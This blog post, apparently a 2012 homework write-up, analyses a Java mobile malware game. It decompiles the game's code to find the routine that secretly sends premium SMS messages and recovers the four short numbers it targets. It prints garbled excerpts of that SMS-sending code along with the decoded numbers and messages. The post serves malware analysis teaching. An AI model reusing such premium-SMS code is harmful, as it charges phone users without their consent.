<!DOCTYPE html>
<html lang="en"
>
<head>
    <title>Mobile Malware Analysis - Predrag TASEVSKI - Pece</title>
    <!-- Using the latest rendering mode for IE -->
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">



<link rel="canonical" href="../../../../posts/2012/01/mobile-malware-analysis/">

        <meta name="author" content="Predrag TASEVSKI - Pece" />
        <meta name="keywords" content="cell phone,malware,mobile,mobile malware analysis,network crime,phone,phone games,phone malware,security,sms,binary" />
        <meta name="description" content="PURPOSE The goal of this post is to identify and analyze mobile malware file: mmc.jar. Thereby please follow the following steps for completing the task: Unpack the file (hint – using zip on .jar) Examine .class files using tool available here (local copies for Mac and Linux and Win Find ..." />

    <!-- Enable latex plugin -->




    <!-- Bootstrap -->
        <link rel="stylesheet" href="../../../../theme/css/bootstrap.min.css" type="text/css"/>
    <link href="../../../../theme/css/font-awesome.min.css" rel="stylesheet">

    <link href="../../../../theme/css/pygments/native.css" rel="stylesheet">
    <link rel="stylesheet" href="../../../../theme/css/style.css" type="text/css"/>

        <link href="../../../../feeds/all.atom.xml" type="application/atom+xml" rel="alternate"
              title="Predrag TASEVSKI - Pece ATOM Feed"/>


        <link href="../../../../feeds/category/misc.atom.xml" type="application/atom+xml" rel="alternate"
              title="Predrag TASEVSKI - Pece misc ATOM Feed"/>

</head>
<body>

<div class="navbar navbar-default navbar-fixed-top" role="navigation">
    <div class="container">
        <div class="navbar-header">
            <button type="button" class="navbar-toggle" data-toggle="collapse" data-target=".navbar-ex1-collapse">
                <span class="sr-only">Toggle navigation</span>
                <span class="icon-bar"></span>
                <span class="icon-bar"></span>
                <span class="icon-bar"></span>
            </button>
            <a href="../../../../" class="navbar-brand">
Predrag TASEVSKI - Pece            </a>
        </div>
        <div class="collapse navbar-collapse navbar-ex1-collapse">
            <ul class="nav navbar-nav">
                         <li><a href="../../../../pages/about.html">
                             About
                          </a></li>
                         <li><a href="../../../../pages/photography.html">
                             Photography
                          </a></li>
                         <li><a href="../../../../pages/projects.html">
                             Projects
                          </a></li>
                         <li><a href="../../../../pages/publications.html">
                             Publications
                          </a></li>
                         <li><a href="../../../../pages/cv.html">
                             CV
                          </a></li>
                         <li><a href="../../../../pages/talks.html">
                             Talks
                          </a></li>
                         <li><a href="../../../../pages/teachings.html">
                             Teachings
                          </a></li>
            </ul>
            <ul class="nav navbar-nav navbar-right">
                <li><a href="../../../../archives.html"><i class="fa fa-th-list"></i><span class="icon-label">Archives</span></a></li>
            </ul>
        </div>
        <!-- /.navbar-collapse -->
    </div>
</div> <!-- /.navbar -->

<div class="container">
    <div class="row">
        <div class="col-sm-9">

    <section id="content">
        <article>
            <header class="page-header">
                <h1>
                    <a href="../../../../posts/2012/01/mobile-malware-analysis/"
                       rel="bookmark"
                       title="Permalink to Mobile Malware Analysis">
                        Mobile Malware Analysis
                    </a>
                </h1>
            </header>
            <div class="entry-content">
                <div class="panel">
                    <div class="panel-body">
<footer class="post-info">
    <span class="label label-default">Date</span>
    <span class="published">
        <i class="fa fa-calendar"></i><time datetime="2012-01-17T00:00:00+01:00"> вто, 17 јан 2012</time>
    </span>



<span class="label label-default">Tags</span>
	<a href="../../../../tag/cell-phone/">cell phone</a>
        /
	<a href="../../../../tag/malware/">malware</a>
        /
	<a href="../../../../tag/mobile/">mobile</a>
        /
	<a href="../../../../tag/mobile-malware-analysis/">mobile malware analysis</a>
        /
	<a href="../../../../tag/network-crime/">network crime</a>
        /
	<a href="../../../../tag/phone/">phone</a>
        /
	<a href="../../../../tag/phone-games/">phone games</a>
        /
	<a href="../../../../tag/phone-malware/">phone malware</a>
        /
	<a href="../../../../tag/security/">security</a>
        /
	<a href="../../../../tag/sms/">sms</a>
        /
	<a href="../../../../tag/binary/">binary</a>
    
</footer><!-- /.post-info -->                    </div>
                </div>
                <h1>PURPOSE</h1>
</p>

<p>The goal of this post is to identify and analyze mobile malware file:
<a href="https://sim.cert.ee/hw/mmc.jar">mmc.jar</a>. Thereby please follow the
following steps for completing the task:</p>
</p>

<ul>
<li>Unpack the file (hint – using zip on .jar)</span></li>
<li>Examine .class files using tool available
    <a href="http://java.decompiler.free.fr/?q=jdgui">here</a> (local copies for
    <a href="https://sim.cert.ee/hw/jd-gui-0.3.3.osx.i686.dmg">Mac</a> and
    <a href="https://sim.cert.ee/hw/jd-gui-0.3.3.linux.i686.tar.gz">Linux</a> and
    <a href="https://sim.cert.ee/hw/jd-gui-0.3.3.windows.zip">Win</a></li>
<li>Find code sending SMSes using ‘sms://’ URI</li>
<li>Calculate short number used in SM.send</li>
<li>Finally for compiling the code use the developing tool <a href="http://www.eclipse.org/">Eclipse
    IDE</a>.</li>
</ul>
</p>

<p>Firstly, we are going to analysis the Java source code after
decompilation. The accent is to find the code that is sending an SMSes
using the ‘sms://’ URL. After identifying the linking associated classes
we have to compile the code to move toward to final results of URLs. For
this purpose we are using the developing tool <a href="http://www.eclipse.org/downloads/">Eclipse
IDE</a>.</p>
</p>

<p>Therefore, the results and the sent SMSes URLs are going to be presented
into conclusion section. Which will complete the task and will yield the
basic analysis of mobile malware file.</p>
</p>

<h1>ANALYSIS</h1>
</p>

<p>After running the decompiler tool we are examining and analyzing the
Java source code. Whereby on the source code on the class M.class line
343 we have found the following source code:</p>
</p>

<div class="highlight">

    if ((i &gt;= 35)  (SM.isSending != true)  (i % 6 == 0) (f & count_query)) {  if (SM.GS()) f += 1;   if (f == 1) {            RS.L(rs);            RS.L("Slide");            rs = RS.j("Slide");            game = RS.L(rs, Integer.toString((int)(System.currentTimeMillis() / 1000L)));            RS.L(rs);   }if (f &lt; count_query) {  game = SM.send("sms://" + ms[1][b], ms[2][b]); // sms://  if (b == count_query) b = 1; else b += 1;}

</div>

</p>

<p>The above code is associated with the class SM.class. With the following
source code:</p>
</p>

<div class="highlight">

    public static int send(String s, String s1){   if (isSending) return 0;      new SM(s, s1);   return -1;}public SM(String s, String s1) { success = false; isSending = true; this.destination = s; this.message = s1; try {      Thread thread = new Thread(this);      thread.start(); } catch (Exception exception) { isSending = false;}

</div>

</p>

<p>The above code is checking if the message and the destination is
correct  </p>
<p>and if the message is sent. Coloration is more like the first public
static method named <em>send</em> with the two string values of <em>s</em> and <em>s1</em>.</p>
</p>

<p>All the above extraction was finished by JD-Gui version 0.3.3 and
JD-Core version 0.6.0 and using the menu bar for search, with the
criteria that will meet our needs.</p>
</p>

<p>The bellow are executable results presented, done by eclipse after
compiling the code:</p>
</p>

<div class="highlight">

    /0SIF|6XI8ULE|YNLD5QDA6WM|YJ90RL/+WPJDAFY2 DC3QJ/+3RKA/5YPA0MD-5QFDwhile 7375/88600168904|7202/65510006691|1899/FTEME 1283|8385/88600168904|1 162 333 494 667375 88600168904 //sms://73757202 65510006691 //sms://72021899 fteme 1283 //sms://18998385 88600168904 //sms://8385decoded367375 88600168904427202 65510006691481899 fteme 128354

</div>

</p>

<p>From the above presented results after compiling the code we have
identify the number of SMSes URLs and in addition the exact URLs.</p>
</p>

<h1>CONCLUSION</h1>
</p>

<p>We live in a world where nowadays for everyday work, communication, etc.
the most essentially tool is our mobile phones, smart phones, etc. We
used them for communication, sending SMS, playing games, checking
e-mails, social networking, bank transaction, etc. That is why today
there are hundreds and rising everyday mobile malware files. We need to
make sure what we are installing in our devices, what kind of games,
applications, etc. Therefore, this post will help for a people who are
interested to learn basic of how to analysis and identify malware files
for mobile phones. However, this is only a basic, and a good guide to
give you an idea of what kind of tools, applications you should have.
This task is done only for a Java source code mobile malware game.</p>
</p>

<p>Furthermore, from the above section we have identify the number of SMSes
that are sent and to what numbers. The total number of SMSes is 4 and
sent to the following URLs:</p>
</p>

<div class="highlight">

    sms://7375sms://7202sms://1899sms://8385

</div>

</p>

<p>Finally, mobile malware is rising and it is about to explode, therefore
users need education[1]. By delivering basic and advance mobile malware
security awareness program we will have less malware attacks and better
security policy into everyday mobile, smart phones usage.</p>
</p>

<h1>Bibliography</h1>
</p>

<p>[1] Chris Martin, Mobile malware is about to explode, users need
education, 20 Jan. 2012,
<a href="http://www.theinquirer.net/inquirer/opinion/2140338/mobile-malware-explode-users-education">http://www.theinquirer.net/inquirer/opinion/2140338/mobile-malware-explode-users-education</a></p>
</p>
            </div>
            <!-- /.entry-content -->
    <hr/>
    <section class="comments" id="comments">
        <h2>Comments</h2>

        <div id="disqus_thread"></div>
        <script type="text/javascript">
            /* * * CONFIGURATION VARIABLES: EDIT BEFORE PASTING INTO YOUR WEBPAGE * * */
            var disqus_shortname = 'http://predragtasevski.com/'; // required: replace example with your forum shortname

                    var disqus_identifier = 'mobile-malware-analysis';
                var disqus_url = '/posts/2012/01/mobile-malware-analysis/';

            var disqus_config = function () {
                this.language = "en";
            };

            /* * * DON'T EDIT BELOW THIS LINE * * */
            (function () {
                var dsq = document.createElement('script');
                dsq.type = 'text/javascript';
                dsq.async = true;
                dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
                (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
            })();
        </script>
        <noscript>Please enable JavaScript to view the <a href="http://disqus.com/?ref_noscript">comments powered by
            Disqus.</a></noscript>
        <a href="http://disqus.com" class="dsq-brlink">comments powered by <span class="logo-disqus">Disqus</span></a>

    </section>
            <!-- /.next and prevous post -->

            <ul>
              <li>
                  <a href="../../../../posts/2012/01/regular-expression/">
                    Regular Expression
                  </a>
              </li>
              <li>
                <a href="../../../../posts/2012/02/honeypot-document/">
                  Honeypot document
                </a>
              </li>
            </ul>
        </article>
    </section>

        </div>
        <div class="col-sm-3 well well-sm" id="sidebar">

<aside>
    <section>
        <ul class="list-group list-group-flush">
                <li class="list-group-item"><h4><i class="fa fa-home fa-lg"></i><span class="icon-label">Social</span></h4>
                  <ul class="list-group" id="social">
                    <li class="list-group-item"><a href="https://www.linkedin.com/in/tpredrag"><i class="fa fa-linkedin-square fa-lg"></i> Linkedin</a></li>
                    <li class="list-group-item"><a href="https://twitter.com/stepcellwolf"><i class="fa fa-twitter-square fa-lg"></i> Twitter</a></li>
                    <li class="list-group-item"><a href="https://github.com/stepcellwolf/"><i class="fa fa-github-square fa-lg"></i> Github</a></li>
                    <li class="list-group-item"><a href="https://plus.google.com/u/0/+PredragTasevski/posts/p/pub"><i class="fa fa-google-plus-square fa-lg"></i> Google+</a></li>
                    <li class="list-group-item"><a href="https://www.flickr.com/photos/29569957@N00"><i class="fa fa-flickr fa-lg"></i> Flickr</a></li>
                    <li class="list-group-item"><a href="/feeds/all.atom.xml"><i class="fa fa-rss-square fa-lg"></i> RSS</a></li>
                  </ul>
                </li>



                <li class="list-group-item"><a href="../../../../"><h4><i class="fa fa-tags fa-lg"></i><span class="icon-label">Tags</span></h4></a>
                    <ul class="list-group " id="tags">
                    </ul>
                </li>    
    <li class="list-group-item"><h4><i class="fa fa-external-link-square fa-lg"></i><span class="icon-label">Links</span></h4>
      <ul class="list-group" id="links">
        <li class="list-group-item">
            <a href="http://cybersecurity.mk/" target="_blank">
                Cybersecurity.mk
            </a>
        </li>
        <li class="list-group-item">
            <a href="http://getpelican.com/" target="_blank">
                Pelican
            </a>
        </li>
        <li class="list-group-item">
            <a href="http://python.org/" target="_blank">
                Python.org
            </a>
        </li>
        <li class="list-group-item">
            <a href="http://jinja.pocoo.org/" target="_blank">
                Jinja2
            </a>
        </li>
      </ul>
    </li>

        </ul>
    </section>

</aside>        </div>
    </div>
</div>
<footer>
   <div class="container">
      <hr>
      <div class="row">
         <div class="col-xs-10">&copy; 2015 Predrag TASEVSKI - Pece
            &middot; Powered by <a href="https://github.com/DandyDev/pelican-bootstrap3" target="_blank">pelican-bootstrap3</a>,
            <a href="http://docs.getpelican.com/" target="_blank">Pelican</a>,
            <a href="http://getbootstrap.com" target="_blank">Bootstrap</a>         </div>
         <div class="col-xs-2"><p class="pull-right"><i class="fa fa-arrow-up"></i> <a href="#">Back to top</a></p></div>
      </div>
   </div>
</footer>
<script src="../../../../theme/js/jquery.min.js"></script>

<!-- Include all compiled plugins (below), or include individual files as needed -->
<script src="../../../../theme/js/bootstrap.min.js"></script>

<!-- Enable responsive features in IE8 with Respond.js (https://github.com/scottjehl/Respond) -->
<script src="../../../../theme/js/respond.min.js"></script>

    <!-- Disqus -->
    <script type="text/javascript">
        /* * * CONFIGURATION VARIABLES: EDIT BEFORE PASTING INTO YOUR WEBPAGE * * */
        var disqus_shortname = 'http://predragtasevski.com/'; // required: replace example with your forum shortname

        /* * * DON'T EDIT BELOW THIS LINE * * */
        (function () {
            var s = document.createElement('script');
            s.async = true;
            s.type = 'text/javascript';
            s.src = '//' + disqus_shortname + '.disqus.com/count.js';
            (document.getElementsByTagName('HEAD')[0] || document.getElementsByTagName('BODY')[0]).appendChild(s);
        }());
    </script>
    <!-- End Disqus Code -->
    <!-- Google Analytics -->
    <script type="text/javascript">

        var _gaq = _gaq || [];
        _gaq.push(['_setAccount', 'UA-600234-3']);
        _gaq.push(['_trackPageview']);

        (function () {
            var ga = document.createElement('script');
            ga.type = 'text/javascript';
            ga.async = true;
            ga.src = ('https:' == document.location.protocol ? 'https://ssl' : 'http://www') + '.google-analytics.com/ga.js';
            var s = document.getElementsByTagName('script')[0];
            s.parentNode.insertBefore(ga, s);
        })();
    </script>
    <!-- End Google Analytics Code -->
</body>
</html>